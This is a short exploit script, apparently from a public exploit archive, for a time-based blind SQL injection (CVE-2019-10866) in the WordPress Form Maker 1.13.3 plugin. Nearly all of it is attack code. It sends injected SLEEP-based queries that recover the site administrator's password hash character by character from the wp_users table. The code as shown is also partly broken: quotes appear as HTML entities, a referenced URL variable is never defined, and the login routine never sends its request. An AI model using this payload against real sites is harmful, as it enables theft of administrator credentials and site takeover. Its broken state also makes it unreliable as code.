# Exploit Title: WordPress Plugin Form Maker 1.13.3 - SQL Injection
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://10web.io/plugins/
# Version: 1.13.3
# Tested on: Ubuntu 18.04
# CVE : CVE-2019-10866

import requests
import time

session = requests.Session()
dictionary = &#039;@._-$/\\"ยฃ%&;ยง+*1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#039;
flag = True
username = "username"
password = "password"
temp_password = ""
TIME = 0.5

def login(username, password):
    payload = {
        &#039;log&#039;: username,
        &#039;pwd&#039;: password,
        &#039;wp-submit&#039;: &#039;Login&#039;,
        &#039;testcookie&#039;: 1
    }

def print_string(str):
    print "\033c"
    print str

def get_admin_pass():
    len_pwd = 1
    global flag
    global temp_password
    while flag:
        flag = False
        ch_temp = &#039;&#039;
        for ch in dictionary:
            print_string("[*] Password dump: " + temp_password + ch)
            ch_temp = ch
            start_time = time.time()
            r = session.get(url_vuln + &#039;,(case+when+(select+ascii(substring(user_pass,&#039; + str(len_pwd) + &#039;,&#039; + str(len_pwd) + &#039;))+from+wp_users+where+id%3d1)%3d&#039; + str(ord(ch)) + &#039;+then+(select+sleep(&#039; + str(TIME) + &#039;)+from+wp_users+limit+1)+else+2+end)+asc%3b&#039;)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            temp_password += ch_temp
            len_pwd += 1

login(username, password)
get_admin_pass()
print_string("[+] Password found: " + temp_password)

